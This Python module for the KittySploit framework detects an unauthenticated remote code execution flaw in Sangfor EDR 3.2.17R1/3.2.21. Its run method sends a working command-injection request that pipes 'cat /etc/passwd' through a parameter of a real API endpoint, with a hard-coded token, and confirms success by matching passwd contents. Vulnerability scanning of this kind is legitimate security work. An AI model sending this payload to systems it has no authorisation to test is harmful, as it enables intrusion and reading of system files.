#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sangfor EDR 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution Detection',
        'description': 'Sangfor EDR 3.2.17R1/3.2.21 allows remote unauthenticated users to to execute arbitrary commands.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'rce', 'sangfor', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.cnblogs.com/0day-li/p/13650452.html'],
    }

    def run(self):
        path = '/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='{"params":"w=123\\"\'1234123\'\\"|cat /etc/passwd"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='critical',
                reason='Sangfor EDR 3.2.17R1/3.2.21 - Remote Code Execution detected',
                path=path,
            )
            return True
        return False

